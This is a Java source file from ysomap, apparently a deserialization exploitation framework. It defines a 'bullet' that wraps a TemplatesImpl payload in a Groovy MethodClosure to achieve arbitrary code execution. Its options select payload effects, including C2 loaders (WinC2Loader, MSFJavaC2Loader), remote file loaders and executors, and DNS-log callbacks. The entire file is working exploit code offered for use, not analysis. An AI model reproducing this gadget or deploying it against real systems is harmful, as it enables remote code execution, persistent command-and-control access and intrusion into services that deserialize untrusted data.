package ysomap.bullets.groovy;

import org.codehaus.groovy.runtime.MethodClosure;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.TemplatesImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.DetailHelper;

/**
 * @author wh1t3p1g
 * @since 2021/8/6
 */
@Bullets
@Dependencies({"org.codehaus.groovy:groovy:2.4.3"})
@Details("任意代码执行")
@Targets({Targets.JDK})
@Authors({Authors.WH1T3P1G})
public class ClosureWithTemplatesImplBullet extends AbstractBullet<Object> {

    @NotNull
    @Require(name = "body" ,detail = DetailHelper.BODY)
    private String body = "";

    @NotNull
    @Require(name = "effect", type = "string", detail="选择载入payload的效果，" +
            "可选default、" +
            "TomcatEcho、SocketEcho、RemoteFileLoader、WinC2Loader、MSFJavaC2Loader、" +
            "RemoteFileHttpLoader、RemoteFileHttpExecutor、DnslogLoader、RunClassLoader")
    private String effect = "default";

    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
    private String exception = "false";

    @Override
    public Object getObject() throws Exception {
        Bullet bullet = TemplatesImplBullet.newInstance(body, effect, exception);
        return new MethodClosure(bullet.getObject(), "getOutputProperties");
    }

    public static ClosureWithTemplatesImplBullet newInstance(Object... args) throws Exception {
        ClosureWithTemplatesImplBullet bullet = new ClosureWithTemplatesImplBullet();
        bullet.set("type", args[0]);
        bullet.set("body", args[1]);
        bullet.set("effect", args[2]);
        bullet.set("exception", args[3]);
        return bullet;
    }
}
